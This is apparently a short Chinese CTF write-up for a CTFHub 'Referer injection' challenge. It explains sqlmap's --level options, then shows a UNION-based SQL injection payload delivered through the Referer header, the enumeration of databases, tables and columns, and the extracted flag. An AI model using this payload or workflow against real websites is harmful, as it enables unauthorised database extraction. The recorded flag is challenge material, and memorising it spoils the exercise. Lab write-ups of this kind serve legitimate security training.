---
title: Refer注入
date: 2024-11-24T00:02:16Z
lastmod: 2024-11-24T00:52:58Z
---

# Refer注入

**level有5级，越高检测越全，默认为 1**

> --level 1 检测Get和Post
>
> --level 2 检测HTTP Cookie
>
> --level 3 检测User-Agent和Referer
>
> --level 4 检测
>
> --level 5 检测 HOST 头

 --

```shell
---
Parameter: Referer (Referer)
    Type: UNION query
    Title: Generic UNION query (random number) - 2 columns
    Payload: -5848 UNION ALL SELECT CONCAT(0x7171787a71,0x6543727846745555584e4546736d6442655a6c63646a786c626d6f634b6e6f4c43554a6a4b746676,0x7170787871),3313-- -
---
```

```shell
available databases [4]:                                                                                             
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
```

```shell
Database: sqli                                                                                                       
[2 tables]
+------------+
| news       |
| tqslaiphcq |
+------------+
```

```shell
Database: sqli
Table: tqslaiphcq
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| lpmuqabrgy | varchar(100) |
+------------+--------------+

```

```shell
Database: sqli
Table: tqslaiphcq
[1 entry]
+----------------------------------+
| lpmuqabrgy                       |
+----------------------------------+
| ctfhub{51e1881db6437cceea0c3876} |
+----------------------------------+
```
